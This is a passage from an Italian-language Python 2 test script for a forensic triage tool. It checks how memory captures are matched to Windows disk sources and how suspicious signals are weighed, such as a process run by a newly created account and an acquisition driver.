    scrivi_raccolta(os.path.join(c, 'a'), output(base(), connessioni(False), u'PC-A'), u'PC-A')
    scrivi_raccolta(os.path.join(c, 'senza'), output(base(), connessioni(False), u'PC-A'), u'PC-A', nel_manifesto=False)
    o = tc_origine.OrigineCartella(c, u'/LogicalFileSet1/')
    trovate = dict([(e.cartella, e) for e in tc_memoria.trova(o)])
    prova(len(trovate) == 3, 'tre manifesti trovati')

    def scelta(computer, memorie, installazioni=1, raccolta=None, contesto=None):
        r = tc_origine.Radice(o, u'/logicalfileset1/c/', None, piatta=False)
        t = tc_controlli.Triage(r)
        t.contesto['computer'] = computer
        t.contesto['installazioni_origine'] = installazioni
        t.contesto.update(contesto or {})
        t.raccolta = raccolta
        t.memorie = memorie
        tc_memoria.analizza(t)
        t.decidi()
        return t

    def memoria(cartella, modo=tc_memoria.STESSA_ORIGINE):
        return tc_memoria.Memoria(o, trovate[u'/LogicalFileSet1/%s/' % cartella], u'altra', modo == tc_memoria.STESSA_ORIGINE,
                                  modo)

    t = scelta(u'PC-A', [memoria('a')])
    prova(len(t.contesto.get('memorie', [])) == 1 and t.contesto['memorie'][0]['modo'] == tc_memoria.STESSA_ORIGINE,
          'la RAM nella stessa origine, con una sola installazione, si usa')
    t = scelta(u'PC-A', [memoria('a')], installazioni=2)
    prova(not t.contesto.get('memorie') and [x for x in t.avvisi if u'2 installazioni di Windows' in x],
          'con due installazioni nell\'origine la RAM non va a nessuna (B3): %s' % t.avvisi)
    t = scelta(u'PC-A', [memoria('b', tc_memoria.STESSO_HOST)])
    prova(len(t.contesto.get('memorie', [])) == 1 and u'stesso host' in t.contesto['memorie'][0]['chi'],
          'la RAM di un\'origine dello stesso host si usa')
    t = scelta(u'PC-A', [memoria('a', tc_memoria.ALTRO_HOST)])
    prova(not t.contesto.get('memorie') and [x for x in t.note if u'altro host' in x and u'PC-A' in x],
          'la RAM con lo stesso nome ma di un altro host non si usa, con una nota')
    t = scelta(u'PC-A', [memoria('b', tc_memoria.ALTRO_HOST)])
    prova(not t.contesto.get('memorie') and not t.note, 'la RAM di un altro computer e di un altro host: nulla')
    t = scelta(u'PC-A', [memoria('b', tc_memoria.INDICATA)])
    prova(len(t.contesto.get('memorie', [])) == 1 and u'impostazioni' in t.contesto['memorie'][0]['chi'],
          'la RAM scelta nelle impostazioni si usa')
    m = memoria('senza')
    t = scelta(u'PC-A', [m])
    prova(len(t.contesto.get('memorie', [])) == 1 and m.computer == u'PC-A', 'nome del computer dalle variabili d\'ambiente')

    # 13. controlli di compatibilita' con il disco (B7)
    def raccolta(build=22621, avvio='08:00:01', nomi=(u'pc-a',), sid=u'S-1-5-21-1111111111-2222222222-3333333333-1001',
                 dal='07:00:00', al='15:00:00'):
        rac = tc_eventi.Raccolta()
        rac.avvii = [{'ora': epoca(avvio), 'build': build, 'computer': nomi[0], 'record': 1, 'scritto': epoca(avvio),
                      'elemento': None}]
        rac.copertura = {u'system.evtx': [epoca(dal), epoca(al), 100, None, 0, epoca(al), 0, 0, 0, 100],
                         u'security.evtx': [epoca(dal), epoca(al), 100, None, 0, epoca(al), 0, 0, 0, 100]}
        rac.nomi = dict([(n, [epoca(dal), epoca(al), 10, n.upper()]) for n in nomi])
        rac.account = [{'ora': epoca(dal), 'id': 4720, 'soggetto': u'x', 'bersaglio': u'PC-A\\mario', 'sid_bersaglio': sid,
                        'membro': u'', 'nome_membro': u'', 'computer': nomi[0], 'elemento': None}]
        return rac

    def esiti(t):
        return dict([(nome, esito) for nome, esito, _, _ in t.contesto['memorie'][0]['controlli']])

    t = scelta(u'PC-A', [memoria('a')], raccolta=raccolta())
    e = esiti(t)
    prova(e == {u'build di Windows': u'concorda', u'nome del computer': u'concorda', u'avvio di Windows': u'concorda',
                u'SID della macchina': u'concorda', u'ora dell\'acquisizione': u'concorda'}, 'tutto concorda: %r' % e)
    prova(not t.avvisi and t.contesto['memorie'][0]['conta'], 'tutto concorda: nessun avviso')
    t = scelta(u'PC-A', [memoria('b', tc_memoria.STESSO_HOST)], raccolta=raccolta(build=19045, sid=u'S-1-5-21-9-9-9-1001'))
    e = esiti(t)
    prova(e[u'build di Windows'] == u'contraddice' and e[u'SID della macchina'] == u'contraddice' and
          e[u'nome del computer'] == u'contraddice', 'RAM di un\'altra macchina: %r' % e)
    prova(not t.contesto['memorie'][0]['conta'] and [x for x in t.avvisi if u'non sembra di questa installazione' in x],
          'RAM contraddetta: non conta, con un avviso')
    prova([x for x in t.segnali if x.peso == R.DECISIVO] and not [x for x in t.segnali if x.conta],
          'i suoi indizi restano ma non contano')
    prova(t.verdetto == tc_controlli.V_DA_VERIFICARE, 'RAM contraddetta: il verdetto non usa i suoi indizi: %s' % t.verdetto)
    t = scelta(u'PC-A', [memoria('a')], raccolta=raccolta(avvio='08:30:00'))
    prova(esiti(t)[u'avvio di Windows'] == u'contraddice' and not t.contesto['memorie'][0]['conta'],
          'avvio diverso, con il registro System che lo copre: contraddice')
    t = scelta(u'PC-A', [memoria('a')], raccolta=raccolta(avvio='08:30:00', dal='09:00:00'))
    prova(esiti(t)[u'avvio di Windows'] == u'non verificabile', 'il registro System non copre l\'avvio: non verificabile')
    t = scelta(u'PC-NUOVO', [memoria('a')], raccolta=raccolta(nomi=(u'pc-nuovo',)))
    prova(esiti(t)[u'nome del computer'] == u'contraddice' and t.contesto['memorie'][0]['conta'] and
          [x for x in t.avvisi if u'da verificare' in x], 'solo il nome diverso: avviso, ma la RAM conta')
    t = scelta(u'PC-NUOVO', [memoria('a')], raccolta=raccolta(nomi=(u'pc-nuovo', u'pc-a')))
    prova(esiti(t)[u'nome del computer'] == u'concorda', 'il nome vecchio nei registri: concorda (B4)')
    t = scelta(u'PC-A', [memoria('a')], raccolta=raccolta(dal='2026-09-01T00:00:00'[11:], al='07:30:00'))
    prova(esiti(t)[u'ora dell\'acquisizione'] == u'concorda', 'acquisizione entro un giorno dalla fine dei registri')

    # 14. account appena creato e processi della RAM con quell'utente (M5)
    c = os.path.join(radice, 'account')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base() + [processo(8100, 8000, u'sshd.exe', u'sshd.exe', '13:00:00',
                    u'C:\\Windows\\System32\\OpenSSH\\sshd.exe', utente=u'servicemgmt',
                    sid=u'S-1-5-21-1111111111-2222222222-3333333333-1002')], connessioni(False), u'PC-A'), u'PC-A')
    o = tc_origine.OrigineCartella(c, u'/LogicalFileSet1/')
    r = tc_origine.Radice(o, u'/logicalfileset1/c/', None, piatta=False)
    t = tc_controlli.Triage(r)
    t.contesto['computer'] = u'PC-A'
    t.riferimento = epoca('14:00:00')
    rac = raccolta()
    rac.account.append({'ora': epoca('12:58:00'), 'id': 4720, 'soggetto': u'PC-A\\PC-A$', 'bersaglio': u'PC-A\\servicemgmt',
                        'sid_bersaglio': u'S-1-5-21-1111111111-2222222222-3333333333-1002', 'membro': u'',
                        'nome_membro': u'', 'computer': u'pc-a', 'elemento': None})
    t.raccolta = rac
    t.memorie = [tc_memoria.Memoria(o, e, u'origine', True) for e in tc_memoria.trova(o)]
    tc_memoria.analizza(t)
    import tc_c_eventi
    tc_c_eventi._account(t, rac)
    t.decidi()
    in_ram = [x for x in t.segnali if x.ram is not None and u'servicemgmt' in x.descrizione]
    creato = [x for x in t.segnali if x.ram is None and u'servicemgmt' in x.descrizione]
    prova(len(in_ram) == 1 and in_ram[0].peso == R.DA_CONFERMARE and in_ram[0].famiglia == R.F_ACCOUNT,
          'processo della RAM con l\'utente di un account appena creato: %s' % [x.descrizione for x in t.segnali])
    prova(creato and in_ram and creato[0].fenomeno == in_ram[0].fenomeno, 'lo stesso account: un fatto solo (D1)')

    # 15. il driver dello strumento di acquisizione nella RAM (S3)
    c = os.path.join(radice, 'driver')
    TEMP = u'C:\\Users\\mario\\AppData\\Local\\Temp\\'
    strumento = processo(8200, 3304, u'winpmem_mini_x', TEMP + u'winpmem_mini_x64_rc2.exe C:\\pc.raw', '14:02:00',
                         TEMP + u'winpmem_mini_x64_rc2.exe')
    scrivi_raccolta(os.path.join(c, 'PC-A_vol3'), output(base() + [strumento], connessioni(False), u'PC-A', servizi_extra=[
        (u'winpmem', u'SERVICE_RUNNING', TEMP + u'winpmem.sys'), (u'pmem', u'SERVICE_RUNNING', u'C:\\Users\\Public\\pmem.sys')]),
        u'PC-A')
    t = triage_di(c)
    vero = [x for x in t.segnali if u'\u00abwinpmem\u00bb' in x.descrizione]
    copiato = [x for x in t.segnali if u'\u00abpmem\u00bb' in x.descrizione]
    prova(vero and vero[0].peso == R.INFORMATIVO and u'lo strumento che ha acquisito la memoria' in vero[0].descrizione,
          'driver dello strumento che gira dalla stessa cartella: informativo: %s' % [(x.peso, x.descrizione) for x in vero])
    prova(copiato and copiato[0].peso >= R.DA_CONFERMARE and u'il nome da solo non basta' in copiato[0].descrizione,
          'driver con il solo nome: resta da confermare: %s' % [(x.peso, x.descrizione) for x in copiato])
finally:
    shutil.rmtree(radice, ignore_errors=True)
    tc_lingua.imposta(tc_lingua.ITALIANO)

print 'memoria: %d prove, prove fallite %d' % (fatte[0], falliti[0])
